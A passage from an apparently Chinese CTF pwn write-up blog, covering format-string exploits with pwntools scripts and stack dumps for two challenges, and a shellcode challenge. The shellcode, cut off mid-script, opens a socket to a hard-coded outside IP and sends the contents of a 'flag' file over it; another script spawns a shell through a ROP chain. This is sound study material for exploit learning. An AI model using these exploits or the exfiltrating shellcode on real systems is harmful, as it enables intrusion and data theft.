<span class="number">0x7fff7221d790</span> —▸ <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│     <span class="number">0x7fff7221d798</span> —▸ <span class="number">0x55d2c7dcf4d0</span> ◂— mov eax, <span class="number">0</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│     <span class="number">0x7fff7221d7a0</span> —▸ <span class="number">0x7fff7221d8a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│     <span class="number">0x7fff7221d7a8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│     <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│     <span class="number">0x7fff7221d7b8</span> —▸ <span class="number">0x7fe104e33083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, eax</span><br></pre></td></tr></table></figure>
<p><code>2c:0160│</code>对应的参数偏移是48,于是%*48$c,打印0x7ffff7de6083宽度(有点哈人,幸好alarm给了600秒，而且还重定向了错误流)的字符出来</p>
<p>然后通过<code>16:00b0</code>%n改写<code>1a:00d0</code>为one_gadget</p>
<p>再然后就要考虑如何将返回流劫持到该处,发现程序会两次回栈,所以可以通过<code>03:0018│</code>修改<code>27:0138</code>处的rbp值,使第二次回栈的时候进入控制的流</p>
<p>于是<strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dev_null = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./se&quot;</span>,stderr=dev_null)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your name: &quot;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;b fprintf</span></span><br><span class="line"><span class="string">b *$rebase(0x1335)&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;%*48$c%801983c%26$n%221c%7$hhn\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your phone: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;yourself!&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;~.\n&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这里还有最后一个槛,不算难但要发现着实有点困难</p>
<p>就是要在栈上构造出一个指向栈上的函数地址的栈,即出现<code>03:0018</code>这样的栈</p>
<p>正常来到fprintf并没有这样一个栈内存</p>
<p>不过很巧的是可以发现<code>16:00b0</code>处的值始终指向我们输入的字符的结尾</p>
<p>而在<code>1a:00d0</code>处有一个函数指针,所以如果刚好发送18个数字字符的话,就能获得一个满足要求的栈内存了</p>
<h2 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h2><p><code>/dev/null</code> 是一个特殊的设备文件，用于丢弃数据。在Unix-like系统中，<code>/dev/null</code> 表示空设备，写入它的数据会被丢弃，读取它则会立即得到一个文件结尾（End-of-File）。</p>
<h1 id="2023第六届强网拟态-fmt"><a href="#2023第六届强网拟态-fmt" class="headerlink" title="2023第六届强网拟态-fmt"></a>2023第六届强网拟态-fmt</h1><p><strong>标签:格式化字符串</strong></p>
<p>这题一个难点在于格式化字符串不在栈上</p>
<p>当然影响其实并不很大</p>
<p>首先程序会打印一个栈地址的最后两个字节</p>
<p>断在printf</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffde48</span> —▸ <span class="number">0x555555555250</span> (main+<span class="number">167</span>) ◂— mov edi, <span class="number">0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffde50</span> —▸ <span class="number">0x7fffffffdf50</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffde58</span> ◂— <span class="number">0xafe57b979d2b8b00</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fffffffde68</span> —▸ <span class="number">0x7ffff7de6083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, eax</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffde70</span> ◂— <span class="number">0x50</span> <span class="comment">/* &#x27;P&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fffffffde78</span> —▸ <span class="number">0x7fffffffdf58</span> —▸ <span class="number">0x7fffffffe2aa</span> ◂— <span class="string">&#x27;/home/aichch/pwn/fmt&#x27;</span></span><br></pre></td></tr></table></figure>
<p>可以发现此时栈上有一个三级栈指针06:0030</p>
<p>那么先利用%n修改0x7fffffffe2aa为0x7fffffffe248,再利用%n修改0x555555555250为read的地址</p>
<p>就可以多次利用格式化字符串漏洞了</p>
<p>泄露,打one_gadget就能完成利用</p>
<p><strong>exp:(自己写的未完成但大致是这么个思路)</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">4</span>:],<span class="number">16</span>)-<span class="number">12</span></span><br><span class="line">leak(<span class="string">&quot;stack&quot;</span>,stack)</span><br><span class="line">dbg()</span><br><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">	n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">r(<span class="number">90</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">leak(<span class="string">&quot;libc&quot;</span>,libc.address)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">text=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x11a9</span></span><br><span class="line">leak(<span class="string">&quot;text:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line">payload=</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<p>别人的<strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;/bin/tmux&quot;</span>,<span class="string">&quot;sp&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">sh, data</span>):</span><br><span class="line">    data = data.ljust(<span class="number">0x100</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">sh, atk_addr, write_data</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> target_addr <span class="keyword">in</span> <span class="built_in">range</span>(atk_addr, atk_addr + <span class="built_in">len</span>(write_data), <span class="number">2</span>):</span><br><span class="line">        idx = target_addr - atk_addr</span><br><span class="line">        part_data = u16(write_data[idx: idx + <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((target_addr + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%27$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((part_data + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%41$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x23</span></span><br><span class="line">retn = <span class="number">0xC4</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;./fmt&#x27;)</span></span><br><span class="line">sh = remote(sys.argv[<span class="number">1</span>], <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">stack_ret = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>) - <span class="number">0xC</span></span><br><span class="line">log.success(<span class="string">&quot;stack_ret:\t&quot;</span> + <span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">first = <span class="string">&quot;%c&quot;</span> * <span class="number">9</span></span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>((stack_ret-<span class="number">9</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>((main - stack_ret) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">fmt(sh, first)</span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br><span class="line"></span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c%39$hhn%9$p%11$p\n&quot;</span>.<span class="built_in">format</span>(main &amp; <span class="number">0xFF</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">stack = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack:\t&quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">stack_rop = stack - <span class="number">0x108</span></span><br><span class="line">pop_rdi_addr = libc_base + <span class="number">0x23b6a</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b45bd</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x52290</span></span><br><span class="line">write_data(sh, stack_rop, p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr))</span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(retn) + <span class="string">&quot;%39$hhn&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="printf的一个细节问题"><a href="#printf的一个细节问题" class="headerlink" title="printf的一个细节问题"></a>printf的一个细节问题</h2><p>看两段代码</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%11$hn&quot;</span>.<span class="built_in">format</span>(stack).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">	n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">	n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这两段代码的目的,都是两次连接修改来写printf的返回地址</p>
<p>且效果上看过去是一致的,但实际上<u>第一段代码并不能按照预期工作</u>,仅仅是修改了第一部分的指针，确实做出了一个指向 <code>printf</code> 返回地址的指针，但第二部分通过刚刚做出的指针并没有成功修改掉 <code>printf</code> 函数的返回地址</p>
<p>原理暂时不清楚,但得出的结论是,要像这样通过修改中间指针来指向修改某一个内存,<u>连接过程不能两个都是用<code>$</code>写法</u>,其中一个得是利用正常顺序排列得出</p>
<h3 id="非-格式化顺序"><a href="#非-格式化顺序" class="headerlink" title="非$格式化顺序"></a>非$格式化顺序</h3><p><strong>非$指定的%参数单独计数</strong>,按顺序对应各个参数</p>
<p>例如<code>printf(&quot;%d%2$d%d&quot;,1,2,3)</code></p>
<p>打印结果是122,即$不加入普通参数的记数</p>
<p>在本题中就选择以9个%p和1个%c填充,使得%hn对应相对格式化字符串的第11个参数</p>
<h1 id="2022鹏城杯-ezthree"><a href="#2022鹏城杯-ezthree" class="headerlink" title="2022鹏城杯-ezthree"></a>2022鹏城杯-ezthree</h1><p><strong>标签:socket</strong>本地进程间通信</p>
<p>这题感觉挺有意思,但怎么都找不到附件下载</p>
<p>不过好在程序很简单,直接就着别人的wp也勉强能行</p>
<p>保护是全部开启</p>
<p>前面的代码分析了一坨,结果发现最后压根用不上</p>
<p>真正有用的代码只有下面这段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(shellcode, <span class="number">0x90</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( LODWORD(s[<span class="number">5</span>]) )<span class="comment">//要满足这个条件只需要在开始输入的时候进行一些溢出即可</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_E10(<span class="string">&quot;You want to do sometings ?\n&quot;</span>);</span><br><span class="line">  readshellcode((<span class="type">char</span> *)shellcode + <span class="number">4056</span>, <span class="number">40LL</span>);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode, &amp;unk_203010, <span class="number">0x3D</span>uLL);</span><br><span class="line">  shellcode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点关注这串代码,先是读入shellcode然后关闭了标准流,导致没有任何输出</p>
<p>然后还会在shellcode处开始处移入这一串代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-03-11_194732.png" alt=""></p>
<p>这导致了除了rip以外所有的寄存器都被清空了,特别是rsp,这使得我们几乎无法正常运行有用的代码</p>
<p>这里可以利用到一个知识点fs寄存器存储着tls结构</p>
<p><strong>fs:[0x300]存储着一个栈指针</strong>,因此可以利用这个进行恢复rsp</p>
<p>之后利用mprotect修改栈权限,并在之前的输入中提前输入一些汇编代码,之后调试获得偏移就能执行更多代码了</p>
<p>但现在还有一个非常致命的问题,文件的所有流都被关闭了,这意味着无论是getshell还是orw都无法获得输出</p>
<p>因此这里用到了一个socket通信的技巧</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;114.116.233.171&#x27;,8888)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zero</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;zero&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;nop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jmp</span>(<span class="params">addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">movrax</span>(<span class="params">addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;movrax&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x185E)&quot;)</span></span><br><span class="line"></span><br><span class="line">serv_addr = <span class="number">0x420001</span> <span class="comment"># serv_addr</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rax, 41</span></span><br><span class="line"><span class="string">		mov rdi, 2</span></span><br><span class="line"><span class="string">		mov rsi, 1</span></span><br><span class="line"><span class="string">		mov rdx, 0</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		push 0</span></span><br><span class="line"><span class="string">		mov rcx, 0xABE97472EE260002</span></span><br><span class="line"><span class="string">		push rcx</span></span><br><span class="line"><span class="string">		mov rsi, rsp</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		mov rax, 42</span></span><br><span class="line"><span class="string">		mov rdx, 0x10</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		jmp $+0x32</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line">	</span><br><span class="line">shellcode+=<span class="string">&quot;b&quot;</span>*<span class="number">0x30</span></span><br><span class="line">	</span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		push 0x67616c66</span></span><br><span class="line"><span class="string">		mov rax, 2</span></span><br><span class="line"><span class="string">		xor rdx, rdx</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		xor rsi, rsi</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		xchg rdi, rax</span></span><br><span class="line"><span class="string">		mov rsi, rsp</span></span><br><span class="line"><span class="string">		mov rdx, 0x50</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		mov rax, 1</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">	